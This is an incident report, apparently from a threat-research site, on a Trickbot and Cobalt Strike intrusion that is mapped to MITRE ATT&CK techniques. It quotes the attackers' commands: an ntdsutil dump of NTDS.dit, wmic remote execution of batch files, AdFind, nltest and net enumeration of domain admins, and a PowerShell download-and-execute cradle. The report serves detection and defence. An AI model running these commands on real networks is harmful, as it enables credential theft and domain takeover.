# Case Summary

The Trickbot threat actors used Cobalt Strike to pivot through-out the domain, dumping lsass and ntds.dit as they went. They used tools such as AdFind, Nltest, Net, Bloodhound, and PowerView to peruse the domain, looking for high privileged credentials to accomplish their mission. They used PowerShell, SMB, and WMI to move laterally.

After acquiring the necessary credentials, the threat actors used a technique called Overpass-the-hash to move to a backup server, before being kicked off the network. We believe if this attack had been allowed to continue, it would have ended in domain wide ransomware, specifically Ryuk.

# MITRE ATT&CK

The original delivery mechanism was not found, but likely to have been a malicious email based on previous known Trickbot campaigns.

Trickbot was manually executed on a single endpoint. Source: Hatching Triage | Behavioral Report

# Privilege Escalation

During the intrusion, we witnessed the threat actors elevate privileges on several systems using the built-in GetSystem named pipe privilege escalation tool in Cobalt Strike.

After executing on the infected endpoint, the Trickbot executable injected itself into the Window Error Reporting Manager (wermgr.exe).

Subsequent Trickbot command and control traffic then originated from the injected wermgr.exe process going forward.

Using the YARA rule generated by Malpedia we were able to locate Cobalt Strike injections in the following processes.


# Credential Access

The threat actors employed a couple different credential access techniques. The first technique used was dumping passwords from lsass on the beachhead machine.

After they gained access to a domain controller, we witnessed them use ntdsutil to run the following command:

ntdsutil "ac in ntds" "ifm" "cr fu C:\Perflogs\1"

The above command was executed from a batch file that was dropped and then executed using wmic.

wmic /node:"hostname" process call create "C:\Perflogs\12.bat"

This command, which is included in DPAT, dumps NTDS.dit to disk and has been used by Trickbot actors in the past. The above technique has been around since at least 2014 @chriscampell.


The threat actors ran the AdFind utility for domain discovery.
- C:\Windows\system32\cmd.exe /C adfind.exe -gcb -sc trustdmp > trustdmp.txt
- C:\Windows\system32\cmd.exe /C adfind.exe -f "(objectcategory=group)" > ad_group.txt
- C:\Windows\system32\cmd.exe /C adfind.exe -subnets -f (objectCategory=subnet)> subnets.txt
- C:\Windows\system32\cmd.exe /C adfind.exe -sc trustdmp > trustdmp.txt
- C:\Windows\system32\cmd.exe /C adfind.exe -f "(objectcategory=organizationalUnit)" > ad_ous.txt
- C:\Windows\system32\cmd.exe /C adfind.exe -f "objectcategory=computer" > ad_computers.txt
- C:\Windows\system32\cmd.exe /C adfind.exe -f "(objectcategory=person)" > ad_users.txt

The following net commands were used by the threat actor.
- net user
- net group "domain admins" /domain
- net group "enterprise admins" /domain

While on systems, we also saw them use the following commands.
- systeminfo
- ipconfig

The following Nltest commands were executed several times by the threat actors over the course of the intrusion.
- C:\Windows\system32\cmd.exe /C nltest /dclist:"DOMAINNAME"
- C:\Windows\system32\cmd.exe /C nltest /domain_trusts /all_trusts

The ping command was then used to test connectivity to the domain controllers and other systems.

IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:57637/'); Get-NetComputer -ping -operatingsystem *server*

Bloodhound was ran for domain attack path enumeration.

[Original]

# Lateral Movement

The threat actors utilized several lateral movement techniques. The first of which was using a remote service to execute PowerShell from the registry.

After decoding the above command a couple times and xoring you are left with the following shellcode, which appears to include a named pipe.

This CyberChef Recipe was used to decode the above PS command



The next lateral movement method used is SMB transfer and exec of batch files.

This file was seen executed locally via cmd, and on remote systems using wmic.

[Local]

C:\Windows\system32\cmd.exe /c C:\Perflogs\434.bat

[Remote]

wmic /node:"192.168.1.2" process call create "C:\Perflogs\434.bat"

SMB was also used to transfer Cobalt Strike Beacon executables to the ADMIN$ share on systems, which were then executed via a service.

Additionally, we also witnessed the use of overpass-the-hash. Here we can see a 4624 event with seclogo as the logon process and logon type 9 which tells us some form of pass the hash occurred.

Shortly after we see a couple Kerberos service ticket requests for that user.

This alert fired a couple times based on network activity.

Here’s some helpful information when looking for PTH or OPTH from Stealthbits

Cobalt Strike C2 #1:

Extracted Cobalt Strike Config:

Cobalt Strike C2 #2:

Trickbot Mor1

Based on the activity seen, we assess that the likely final actions would have been ransomware deployment across the domain environment.

Based on research from late last year by Kyle Ehmke, we can assess that the likely ransom deployment would have been Ryuk (Wizard Spider / UNC1878).

Enjoy our report? Please consider donating $1 or more to the project using Patreon. Thank you for your support!

We also have pcaps, files, and Kape packages available here. No memory captures are available for this case.

# MITRE ATT&CK DATASET
User Execution – T1204

Pass the Hash – T1550.002

SMB/Windows Admin Shares – T1021.002

Process Injection – T1055

OS Credential Dumping – T1003

Credential Dumping – T1003

Account Discovery – T1087

Domain Account – T1087.002

Domain Groups – T1069.002

Domain Trust Discovery – T1482

Remote System Discovery – T1018

Remote Services – T1021

Windows Management Instrumentation – T1047

PowerShell – T1059.001

Command-Line Interface – T1059

Commonly Used Port – T1043

Non-Standard Port – T1571

Standard Application Layer Protocol – T1071

Exfiltration Over C2 Channel – T1041

Internal case 1012

Share this: Twitter

LinkedIn

Reddit

Facebook

WhatsApp
